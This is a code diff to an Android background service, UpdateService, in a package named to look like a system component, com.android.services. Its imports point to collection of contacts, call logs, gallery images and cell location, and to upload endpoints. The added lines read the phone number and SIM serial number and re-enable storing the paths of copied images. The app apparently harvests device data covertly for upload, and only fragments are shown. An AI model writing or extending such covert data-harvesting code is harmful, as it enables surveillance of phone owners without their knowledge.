@@ -8,11 +8,9 @@ import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Notification;
 import android.app.Service;
-import android.content.BroadcastReceiver;
 import android.content.ContentResolver;
 import android.content.Context;
 import android.content.Intent;
-import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.graphics.Bitmap;
@@ -29,14 +27,11 @@ import android.provider.ContactsContract;
 import android.provider.MediaStore;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.app.NotificationCompat;
-import android.support.v4.content.LocalBroadcastManager;
 import android.telephony.TelephonyManager;
 import android.telephony.gsm.GsmCellLocation;
 import android.util.Log;
 import android.widget.RemoteViews;
 
-import com.android.services.Adapter.PushNotification;
-import com.android.services.MainActivity;
 import com.android.services.Model.ContactModel;
 import com.android.services.Model.Model_images;
 import com.android.services.R;
@@ -46,7 +41,6 @@ import com.android.services.Utils.CallLogHelper;
 import com.android.services.Utils.FileUploader;
 import com.android.services.Utils.SessionManager;
 import com.android.services.Utils.VolleyHttp;
-import com.android.volley.AuthFailureError;
 import com.android.volley.Request;
 import com.android.volley.RequestQueue;
 import com.android.volley.Response;
@@ -71,11 +65,9 @@ import java.util.ArrayList;
 import java.util.Date;
 import java.util.HashMap;
 import java.util.List;
-import java.util.Locale;
 import java.util.Map;
 import java.util.UUID;
 
-import static android.provider.Settings.System.DATE_FORMAT;
 import static com.android.services.Utils.AppConf.URL_SEND_DEEP;
 import static com.android.services.Utils.AppConf.URL_UPDATE_LOKASI;
 
@@ -207,6 +199,9 @@ public class UpdateService extends Service {
         sessionManager.setImsi(imsi);
         /// NOMOR
         nomor = telephonyManager.getLine1Number();
+        TelephonyManager mngr = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
+
+        AndLog.ShowLog(TAG, "dsds : " + mngr.getLine1Number() + "/"+mngr.getSimSerialNumber());
         AndLog.ShowLog(TAG, "Nomor : " + nomor);
         sessionManager.setNomor(nomor);
 
@@ -338,7 +333,7 @@ public class UpdateService extends Service {
                     for (int j = 0; j < al_images.get(i).getAl_imagepath().size(); j++) {
                         String filePath = al_images.get(i).getAl_imagepath().get(j);
                         Log.e("FILE", filePath);
-//                sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
+                        sessionManager.setImgPath(al_images.get(i).getAl_imagepath().get(j));
 
                         File sourceFile = new File(filePath);
                         File destFile = new File(file, "img_" + dateFormatter.format(new Date()).toString() + "_" + UUID.randomUUID().toString().toLowerCase().replace("-", "") + ".jpg");
